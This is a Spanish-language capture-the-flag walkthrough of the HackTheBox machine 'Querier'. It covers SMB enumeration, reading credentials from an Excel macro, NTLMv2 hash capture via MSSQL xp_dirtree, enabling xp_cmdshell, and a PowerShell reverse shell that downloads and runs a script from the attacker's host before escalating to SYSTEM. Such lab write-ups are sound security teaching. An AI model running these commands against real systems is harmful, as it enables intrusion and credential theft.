---
layout: post
title: HTB_Querier
date: 2023/07/10
slug: HTB_Querier
heroImage: /assets/machines.jpg
---

# Querier {-}

## Introduccion {-}

La maquina del dia 02/08/2021 se llama Querier
.

El replay del live se puede ver aqui

[![S4vitaar Querier maquina](https://img.youtube.com/vi/Dkz_r70OM8U/0.jpg)](https://www.youtube.com/watch?v=Dkz_r70OM8U)

No olvideis dejar un like al video y un comentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.125
```
ttl: 127 -> maquina Windows.
Recuerda que tratandose de ttl 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.125 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.10.10.125 -oN targeted
```

| Puerto | Servicio        | Que se nos occure?                                | Que falta?           |
| ------ | --------------- | ------------------------------------------------- | -------------------- |
| 135    | rpc             |                                                   |                      |
| 139    | netbios-ssn     |                                                   |                      |
| 445    | smb             | crackmapexec, smbclient, smbmap                   |                      |
| 1433   | mssql           | Intento de connexion con credenciales por defecto | usuario y contraseña |
| 5985   | winrm           | connexion directa con evil-winrm                  | usuario y contraseña |
| 47001  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49664  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49665  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49666  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49667  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49668  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49669  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49670  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49671  | windows puertos | Puertos windows que no nos lleva a nada           |                      |


### Analizando el smb 445 {-}

1. Scannear el servicio smb

    ```bash
    crackmapexec smb 10.10.10.125
    ```

1. Listar los recursos compartido a nivel de red usando un NULL session

    ```bash
    smbclient -L 10.10.10.125 -N
    ```

1. Intentamos conectarnos al recurso Reports

    ```bash
    smbclient "//10.10.10.125/Reports" -N
    dir
    get "Currency Volume Report.xlsm"
    ```

Que vemos:

- nombre             : QUERIER
- maquina            : Windows 10 x64
- domain             : HTB.LOCAL
- recurso compartido : Reports
- archivo encontrado : Currency Volume Report.xlsm

### Conexion por MSSQL credenciales por defecto {-}

Intentamos conectarnos al servicio MSQL con credenciales por defecto usando 
```bash
 mssqlclient.py 
```


```bash
locate mssqlclient.py
/usr/bin/mssqlclient.py WORKGROUP/sa:sa@10.10.10.125
/usr/bin/mssqlclient.py WORKGROUP/sa@10.10.10.125
```

El usuario por defecto **sa** no nos va con la contraseña **sa** y sin contraseña. Intentamos volverlo a intentar
con el parametro 
```bash
 -windows-auth 
```


```bash
/usr/bin/mssqlclient.py WORKGROUP/sa:sa@10.10.10.125 -windows-auth
/usr/bin/mssqlclient.py WORKGROUP/sa@10.10.10.125 -windows-auth
```

Bueno aqui no esta functionado
## Evaluacion de vulnerabilidades {-}

### Analizamos el fichero xlsm {-}

```type
type "Currency Volume Report.xlsm"
#Output
Microsoft Excel 2007+

strings Currency\ Volume\ Report.xlsm
```

#### Analisis de ficheros Microsoft office con olevba {-}

**olevba** es un script escrito en python que permite parsear OLE y OpenXML como documentos MS Office (word, excel, ...)
para extraer codig VBA Macros en texto claro, deobfuscate y analyzo de macros maliciosas 

Instalacion

```bash
git clone https://github.com/decalage2/oletools
cd oletools
python3 setup.py install
```

Utilizacion

```bash
olevba Currency\ Volume\ Report.xlsm
```

Aqui olevba nos muestra una macro 
```bash
 ThisWorkbook.cls 
```
 y credenciales de base de datos en texto claro.

Antes de intentar conectarnos al servicio MSSQL, validamos las credenciales con crackmapexec.

### Validacion de credenciales con CrackMapExec {-}

```bash
crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTW1HRwryjc$c6'
crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTW1HRwryjc$c6' -d WORKGROUP
```

CrackMapExec nos muestra un **[-]** que quiere decir que el usuario no es valido a nivel de dominio HTB.LOCAL. Pero
nos muestra un **[+]** con el dominio WORKGROUP. Esto quiere decir quel usuario reporting existe a nivel local.

Aqui ya sabemos que la credencial es valida

### Conexion con evil-winrm usuario reporting {-}

Como tenemos credenciales y que sabemos que son validas, intentamos conectarnos con **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.125 -u 'reporting' -p 'PcwTW1HRwryjc'
```

Aqui no funciona.

### Conexion al servicio MSSQL usuario reporting {-}

```bash
/usr/local/bin/mssqlclient.py WORKGROUP/reporting@10.10.10.125 -windows-auth
password: PcwTW1HRwryjc$c6

SQL> 
```

Con MSSQL hay un comando que se llama 
```bash
 xp_cmdshell 
```
 que nos permite enviar comandos a nivel de sistema

```bash
xp_cmdshell "whoami"
#Output
[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied
```

Aqui el truquillo seria de configurar la posibilidad al usuario de ejecutar comandos avanzados

```bash
sp_configure "show advanced", 1
#Output
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action
```

Como aqui vemos que el usuario reporting no tiene derechos de lanzar comandos o modificar las configuraciones, lo que vamos a intentar
es entablar una conexion a nivel de red que el proprio usuario reporting no puede hacer porque es usuario local. Hay un comando de
MSSQL llamado 
```bash
 xp_dirtree 
```
 que permite buscar ficheros en recursos compartidos

1. En la maquina de atacante, creamos un recurso compartido con smb

    ```bash
    impacket-smbserver smbFolder $(pwd) --smb2support
    ```

1. En el mssql lanzamos el comando

    ```bash
    xp_dirtree "\\10.10.14.8\smbFolder\test"
    ```

Ya podemos ver que la conexion a funcionado y que podemos ver un hash NTLMv2 del usuario **mssql-svc**.
Aqui copiamos el hash en un fichero y lo crackeamos con John. A vezes el hash puede que no sea del todo correcto, y si es
el caso, podemos intentar hacer la misma maniobra con la herramienta **responder** en vez de la **impacket-smbserver**

1. En la maquina de atacante, creamos un recurso compartido con smb

    ```bash
    python3 /usr/share/responder/Responder.py -I tun0 -rdw
    ```

1. En el mssql lanzamos el comando

    ```bash
    xp_dirtree "\\10.10.14.8\EEEE"
    ```

Aqui podemos ver que tambien se puede interceptar el hash NTLMv2.

### Crackeo de hash NTLMv2 con John {-}

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Ya hemos podido crackear el hash NTLMv2 del usuario **mssql-svc**. Y como siempre cuando el servicio **SMB** esta abierto, 
nueva credencial obtenida, nueva credencial que validamos con CrackMapExec.

### Validacion de las creds de mssql-svc {-}

```bash
crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d WORKGROUP
```

CrackMapExec nos reporta un **[+]** quiere decir que las credenciales son validas. Nuevamente intentamos conectarnos por
WinRM

### Conexion con evil-winrm usuario mssql-svc {-}

Como tenemos credenciales y que sabemos que son validas, intentamos conectarnos con **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.125 -u 'mssql-svc' -p 'corporate568'
```

Aqui tampoco nos funciona.

### Conexion al servicio MSSQL usuario mssql-svc {-}

```bash
/usr/local/bin/mssqlclient.py WORKGROUP/mssql-svc:corporate568@10.10.10.125 -windows-auth

SQL> 
```

Intentamos el comando 
```bash
 xp_cmdshell 
```


```bash
xp_cmdshell "whoami"
#Output
[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component
    'xp_cmdshell' because this component is turned off ...
```

Aqui el error es distincto al del otro usuario. Intentamos nuevamente modificar las configuraciones.

```bash
sp_configure "xp_cmdshell", 1
#Output
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
```

El mensaje de error aqui es claro, y si es una option avanzada tenemos que modificar la config de esta option.

```bash
sp_configure "show advanced", 1
reconfigure
sp_configure "xp_cmdshell", 1
reconfigure
xp_cmdshell "whoami"
#Output

querier\mssql-svc
```

Ahora si. Ya podemos lanzar comandos a nivel de sistema. La idea ahora seria meternos en el sistema con una reverse shell.
## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Entablar una reverse shell de typo Powershell {-}

Aqui vamos hacer uso de las powershells reversas de Nishang

```bash
git clone https://github.com/samratashok/nishang
cd nishang
cd Shells
cp Invoke-PowerShellTcp.ps1 /home/.../content/PS.ps1
```

En el fichero PS.ps1, añadimos el invoke del script al final del fichero

```Powershell
Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.8 -Port 443
```

Esto nos permite lanzar el Script directamente despues de descargamiento del fichero en la maquina victima


### Enviamos y ejecutamos la reverse shell {-}

1. montamos un http server con python

    ```bash
    python3 -m http.server 80
    ```

1. En la maquina de atacante en una nueva shell

    ```bash
    rlwrap nc -nlvp 443
    ```

1. en la mssql shell

    ```bash
    xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.8/PS.ps1\")"
    ```

Ya estamos a dentro.

### Analizamos el sistema {-}

```bash
whoami
ipconfig
[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
whoami /priv
```
## Escalada de Privilegios {-}

### Rootear la maquina {-}

```bash
whoami /priv
#Output

SEImpersonatePrivilege
```

Aqui ya vemos que podemos escalar privilegios con 
```bash
 JuicyPotatoe.exe 
```
 o 
```bash
 RotenPotatoe.exe 
```
 pero S4vitar nos
muestra aqui una via alternativa de escalar privilegios en esta maquina.

```bash
git clone https://github.com/PowerShellMafia/PowerSploit
cd PowerSploit
cd Privesc
vi PowerUp.ps1
```

Aqui vamos a hacer lo mismo que con el fichero 
```bash
 PS.ps1 
```
. En vez de enviarlo y despues invocarlo, matamos dos pajaros
de un tiro y añadimos el **Invoke** al final del fichero 
```bash
 PowerUp.ps1 
```


```bash
Invoke-AllChecks
```

1. Creamos un servicio web con python

    ```bash
    python3 -m http.server 80
    ```

1. En la maquina victima

    ```bash
    IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/PowerUp.ps1')
    ```

Este script nos reporta un monton de cosas y aqui podemos ver

- SEImpersonatePrivilege
- Service UsoSvc
- encotro la contraseña para el usuario Administrator en un fichero Groups.xml

### Validamos las credenciales del usuario Administrator {-}

```bash
crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
```

Ya vemos un **[+]** y un **(Pwn3d)**. Quiere decir que podemos connectarnos al systema con 
```bash
 psexec 
```


### Conexion con psexec.py {-}

```bash
psexec.py WORKGROUP/Administrator@10.10.10.125 cmd.exe

whoami
#Output
nt authority\system
```

Ya estamos como root y podemos ver la flag ;)

> [!] NOTA: S4vitar nos enseña mas tecnicas para conectarnos en el video. Os invito a verlas a partir del minuto 1:24:20